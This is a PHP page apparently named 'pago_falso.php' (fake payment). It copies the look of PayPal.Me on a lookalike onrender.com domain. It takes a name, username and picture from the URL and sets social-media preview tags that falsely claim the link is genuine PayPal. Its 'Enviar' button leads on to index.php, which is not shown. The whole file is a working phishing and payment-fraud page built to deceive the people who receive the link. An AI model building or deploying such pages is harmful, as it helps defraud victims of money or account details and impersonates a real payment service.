<?php
// pago_falso.php

$name = $_GET['n'] ?? '';
$user = $_GET['u'] ?? '';
$pic = $_GET['pic'] ?? '';

// Configurar la foto de perfil
$profilePic = '';
if ($pic === 'empty') {
    $profilePic = 'https://paypal-me.onrender.com/assets/images/pp_og.jpg';
} elseif ($pic === 'house') {
    $profilePic = 'https://paypal-me.onrender.com/assets/images/house.jpg';
} else {
    $profilePic = 'https://paypal-me.onrender.com/uploads/' . $pic;
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pague <?php echo htmlspecialchars($name); ?> con PayPal.Me</title>
    
    <!-- Open Graph Meta Tags para previsualización en WhatsApp y redes sociales -->
    <meta property="og:title" content="Pague <?php echo htmlspecialchars($name); ?> con PayPal.Me">
    <meta property="og:description" content="Vaya a paypal.me/<?php echo htmlspecialchars($user); ?> e ingrese el importe. Como es PayPal, es www.paypal.me">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://paypal-me.onrender.com/pago_falso.php?n=<?php echo urlencode($name); ?>&u=<?php echo urlencode($user); ?>&pic=<?php echo urlencode($pic); ?>">
    <meta property="og:image" content="<?php echo htmlspecialchars($profilePic); ?>">
    <meta property="og:site_name" content="PayPal.Me">
    
    <!-- Twitter Card Meta Tags (Opcional pero recomendado) -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Pague <?php echo htmlspecialchars($name); ?> con PayPal.Me">
    <meta name="twitter:description" content="Vaya a paypal.me/<?php echo htmlspecialchars($user); ?> e ingrese el importe. Como es PayPal, es www.paypal.me">
    <meta name="twitter:image" content="<?php echo htmlspecialchars($profilePic); ?>">

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; }
        body { background-color: #f7f9fa; color: #000; min-height: 100vh; display: flex; flex-direction: column; }
        
        /* Header */
        .header {
            background: #fff;
            padding: 0 20px;
            height: 80px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #e5e7eb;
        }
        .header-left {
            display: flex;
            align-items: center;
            gap: 20px;
        }
        .logo-pp {
            font-size: 28px;
            font-weight: 900;
            font-style: italic;
            letter-spacing: -1px;
            color: #000;
        }
        .nav-links {
            display: flex;
            gap: 20px;
        }
        .nav-link {
            font-size: 15px;
            font-weight: 600;
            color: #2c2e2f;
            text-decoration: none;
            display: flex;
            align-items: center;
        }
        .nav-link::after {
            content: "▾";
            margin-left: 4px;
            font-size: 12px;
        }
        .nav-link.no-arrow::after { display: none; }
        
        .header-right {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .btn-head {
            padding: 10px 24px;
            border-radius: 24px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
        }
        .btn-login { border: 1px solid #2c2e2f; color: #2c2e2f; background: transparent; }
        .btn-signup { background: #1a1a1a; color: #fff; border: 1px solid #1a1a1a; }
        .hamburger { display: none; font-size: 24px; cursor: pointer; }

        /* Banner */
        .banner-container {
            width: 100%;
            height: 250px;
            background: #9d2179; /* Base purple */
            background: radial-gradient(circle at right center, #b1288c 0%, #a82585 20%, #9d2179 40%, #8f1d6d 60%, #851b66 80%, #7e1961 100%);
            position: relative;
            overflow: hidden;
            display: flex;
            justify-content: center;
        }
        /* Custom Waves using CSS pseudo-elements for the effect */
        .banner-container::after {
            content: "";
            position: absolute;
            right: -100px;
            top: -100px;
            width: 600px;
            height: 600px;
            border-radius: 50%;
            border: 40px solid rgba(255,255,255,0.05);
            box-shadow: inset 0 0 0 40px rgba(255,255,255,0.05), 
                        inset 0 0 0 80px rgba(255,255,255,0.05), 
                        inset 0 0 0 120px rgba(255,255,255,0.05);
        }

        /* Profile Card */
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: -50px; /* Overlap banner */
            padding: 0 20px;
            z-index: 10;
        }
        
        .profile-card {
            background: #fff;
            width: 100%;
            max-width: 400px;
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
            padding: 40px 30px 20px;
            text-align: center;
            position: relative;
            margin-bottom: 30px;
        }
        
        .profile-pic {
            width: 96px;
            height: 96px;
            background: #fff;
            border-radius: 50%;
            position: absolute;
            top: -48px;
            left: 50%;
            transform: translateX(-50%);
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            padding: 4px;
        }
        
        .name {
            font-size: 24px;
            font-weight: 500;
            color: #1a1a1a;
            margin-top: 15px;
            margin-bottom: 5px;
        }
        
        .username {
            font-size: 15px;
            color: #515354;
            margin-bottom: 30px;
        }
        
        .btn-enviar {
            display: block;
            width: 100%;
            background: #fff;
            color: #0070ba;
            font-size: 16px;
            font-weight: 600;
            text-align: center;
            padding: 14px;
            border-radius: 24px;
            border: 1px solid #cbd2d6;
            text-decoration: none;
            transition: background 0.2s;
        }
        
        .btn-enviar:hover {
            background: #f5f7fa;
        }
        
        .report-link {
            color: #003087;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
        }

        /* Mobile Adjustments */
        @media (max-width: 900px) {
            .nav-links { display: none; }
            .header-right .btn-head { display: none; }
            .header-right .btn-login { display: block; border: 1px solid #1a1a1a; color: #1a1a1a; padding: 6px 16px; font-size: 13px; }
            .hamburger { display: block; }
        }
    </style>
</head>
<body>

    <!-- Header -->
    <header class="header">
        <div class="header-left">
            <div class="logo-pp">PayPal</div>
            <nav class="nav-links">
                <a href="#" class="nav-link">Personal</a>
                <a href="#" class="nav-link">Empresas</a>
                <a href="#" class="nav-link">Grandes empresas</a>
                <a href="#" class="nav-link no-arrow">Desarrollador</a>
            </nav>
        </div>
        <div class="header-right">
            <a href="#" class="nav-link no-arrow" style="margin-right: 10px;">Ayuda</a>
            <a href="#" class="btn-head btn-login">Iniciar sesión</a>
            <a href="#" class="btn-head btn-signup">Abrir cuenta</a>
            <div class="hamburger">☰</div>
        </div>
    </header>

    <!-- Banner -->
    <div class="banner-container"></div>

    <!-- Content -->
    <main class="main-content">
        <div class="profile-card">
            <div class="profile-pic">
                <img src="<?php echo htmlspecialchars($profilePic); ?>" alt="Foto de perfil" style="width: 100%; height: 100%; object-fit: cover; border-radius: 50%;">
            </div>
            
            <h1 class="name"><?php echo htmlspecialchars($name); ?></h1>
            <div class="username">@<?php echo htmlspecialchars($user); ?></div>
            
            <a href="index.php" class="btn-enviar">Enviar</a>
        </div>
        
        <a href="#" class="report-link">Reportar este link</a>
    </main>

</body>
</html>
